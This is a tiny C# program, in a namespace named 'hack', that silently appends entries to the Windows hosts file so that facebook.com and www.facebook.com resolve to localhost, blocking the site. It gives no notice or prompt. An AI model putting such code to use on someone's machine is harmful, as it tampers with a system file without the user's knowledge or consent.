using System;
using System.IO;

namespace hack
{
    internal static class Program
    {

        private const string HostsPath = @"C:\Windows\System32\drivers\etc\hosts";

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        private static void Main()
        {
            using (var sw = new StreamWriter(new FileStream(HostsPath, FileMode.Append)))
            {
                sw.WriteLine();
                sw.WriteLine("127.0.0.1 www.facebook.com");
                sw.WriteLine("127.0.0.1 facebook.com");
            }
        }
    }
}
